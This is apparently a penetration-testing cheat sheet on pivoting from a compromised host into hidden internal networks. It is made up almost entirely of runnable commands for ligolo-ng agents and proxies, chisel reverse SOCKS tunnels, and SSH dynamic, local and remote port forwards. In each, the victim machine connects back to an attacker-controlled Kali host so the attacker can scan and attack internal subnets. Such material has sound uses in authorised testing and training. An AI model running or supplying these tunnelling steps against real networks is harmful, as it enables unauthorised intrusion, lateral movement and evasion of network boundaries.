Pivoting & Tunneling - Cheat Sheet

Once you have a foothold on one host, use it as a relay to reach internal
networks you can't touch directly. Tunnel your Kali tools through the
compromised box to scan and attack the hidden subnet.
Replace the placeholders (<...>) with your own values.


Step 0 - Map what the pivot host can reach

On the compromised host, find its other interfaces / internal subnets:

    ip a            # Linux
    ipconfig /all   # Windows
    arp -a          # neighbours = live internal hosts

The internal subnet (e.g. 10.10.20.0/24) is your new target range.


=== OPTION A: ligolo-ng (recommended - acts like a VPN) ===
Cleanest pivot. You get a real interface, so ALL tools work normally - no
proxychains needed.

Step A1 - On Kali (proxy/server), set up the tun interface:

    sudo ip tuntap add user $(whoami) mode tun ligolo
    sudo ip link set ligolo up
    ./proxy -selfcert         # listens on :11601

Step A2 - On the pivot host, run the agent pointing back to Kali:

    # Linux:   ./agent -connect <kali-ip>:11601 -ignore-cert
    # Windows: agent.exe -connect <kali-ip>:11601 -ignore-cert

Step A3 - In the ligolo proxy console, select the session and start it:

    session            # pick the agent
    start

Step A4 - On Kali, route the internal subnet through the tun interface:

    sudo ip route add <internal-subnet>/24 dev ligolo

Now use any tool directly against the internal subnet:

    nxc smb <internal-target>
    nmap -sT -Pn <internal-target>

(To reach back to a service on Kali, use a ligolo listener.)


=== OPTION B: chisel (SOCKS proxy over HTTP) ===
Great when only HTTP/HTTPS egress is allowed. Pair with proxychains.

Step B1 - On Kali, start the chisel server (reverse mode):

    chisel server -p 8000 --reverse

Step B2 - On the pivot host, connect back and open a reverse SOCKS proxy:

    # Linux:   ./chisel client <kali-ip>:8000 R:socks
    # Windows: chisel.exe client <kali-ip>:8000 R:socks

This opens a SOCKS5 proxy on Kali's 127.0.0.1:1080.

Step B3 - Point proxychains at it (/etc/proxychains4.conf):

    socks5 127.0.0.1 1080

Step B4 - Run tools through it:

    proxychains nxc smb <internal-target>
    proxychains nmap -sT -Pn -p 445,3389 <internal-target>

Note: proxychains only handles TCP. Use -sT (TCP connect) and -Pn with nmap.


=== OPTION C: SSH tunneling (when you have SSH creds) ===

Dynamic (SOCKS) - tunnel anything via proxychains:

    ssh -D 1080 <user>@<pivot-host>
    proxychains nxc smb <internal-target>

Local port forward - bring one remote service to Kali:

    ssh -L 9001:<internal-target>:445 <user>@<pivot-host>
    # now 127.0.0.1:9001 on Kali == <internal-target>:445

Remote port forward - expose a Kali service on the pivot:

    ssh -R 9002:127.0.0.1:443 <user>@<pivot-host>


=== Double pivot (reaching a 2nd hidden network) ===
ligolo: add a second agent on the host bridging into the deeper subnet, add
another route. chisel: chain a second client -> server hop. Keep each subnet
on its own route / proxy and label your terminals.


(optional) Speed up proxychains - set quiet + strict chain in proxychains4.conf:

    quiet_mode
    strict_chain


Key idea: a pivot turns one compromised host into a router into networks your
attacker box can't see. ligolo-ng gives you a near-native VPN-like interface
(all tools just work); chisel and SSH give you a SOCKS proxy you wrap tools in
with proxychains. Either way, you tunnel your existing toolkit through the
foothold - no need to upload tools to the victim.
